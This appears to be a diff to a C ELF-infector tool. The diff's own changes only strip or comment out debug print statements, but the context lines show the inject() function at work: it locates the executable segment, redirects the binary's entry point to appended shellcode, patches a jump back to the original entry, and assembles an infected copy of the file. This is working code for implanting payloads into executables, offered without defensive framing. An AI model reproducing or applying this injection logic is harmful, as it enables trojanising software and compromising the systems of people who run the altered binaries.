@@ -39,13 +39,11 @@ char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
     u_int64_t new_entry_offs = 0;
     u_int64_t old_entry_offs = 0;
     size_t vaddr_base = 0;
-    printf("PFX|PFW=%d",PF_X||PF_W);
     for( int ind=0; ind < ehdr->e_phnum ; ind++ ){
 
         Phdr *p = &phdr[ind];
         printf("Plarogram header %d, flag=%d\n",ind,p->p_flags);
         if(p->p_flags==(PF_X|PF_R)){
-            printf("@@!!!\n");
             x_offset = p->p_offset;
             x_size = p->p_filesz;
             vaddr_base = p->p_vaddr-p->p_offset;
@@ -57,7 +55,6 @@ char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
         }
     }
     
-    printf("a\n");
     for( int ind=0 ; ind<ehdr->e_phnum ; ind++ ){
 
         Phdr *p = &phdr[ind];
@@ -67,7 +64,6 @@ char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
 
         }
     }
-    printf("a\n");
     for( int ind=0; ind<ehdr->e_shnum; ind++ ){
         Shdr *s = &shdr[ind];
         
@@ -80,23 +76,20 @@ char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
         }
     }
 
-    printf("a\n");
 
     old_entry_offs = ehdr->e_entry - vaddr_base;
     ehdr->e_entry = new_entry_offs+vaddr_base;
     ehdr->e_shoff += space;
     int64_t j_back_offs = old_entry_offs - (new_entry_offs + sc_len + sh_code_l);
-    printf("old_entry_offs: 0x%x , new_entry_offs: 0x%x , sh_len: 0x%x \n"
-            "j_back_offs: 0x%x \n\n",
-            old_entry_offs,new_entry_offs,sc_len+sh_code_l,j_back_offs);
+    /*printf("old_entry_offs: 0x%x , new_entry_offs: 0x%x , sh_len: 0x%x \n"*/
+            /*"j_back_offs: 0x%x \n\n",*/
+            /*old_entry_offs,new_entry_offs,sc_len+sh_code_l,j_back_offs);*/
     memcpy(sh_code+1,(char*)&j_back_offs,4);
 
     char * infect_buf = malloc(sizeof(char)*(f_len+space));
-    printf("infect_buf: 0x%08x , f_buf: 0x%08x , x_offs = %d, x_size: %d",
-            infect_buf,f_buf,x_offset,x_size);
-    printf("b\n");
+    /*printf("infect_buf: 0x%08x , f_buf: 0x%08x , x_offs = %d, x_size: %d",*/
+            /*infect_buf,f_buf,x_offset,x_size);*/
     memcpy(infect_buf,f_buf,x_offset+x_size);
-    printf("c\n");
     memcpy(infect_buf+x_offset+x_size , shellcode , sc_len );
     memcpy(infect_buf+x_offset+x_size+sc_len, sh_code, sh_code_l);
     memcpy(infect_buf+x_offset+x_size+space, f_buf+x_offset+x_size, f_len-(x_offset+x_size));
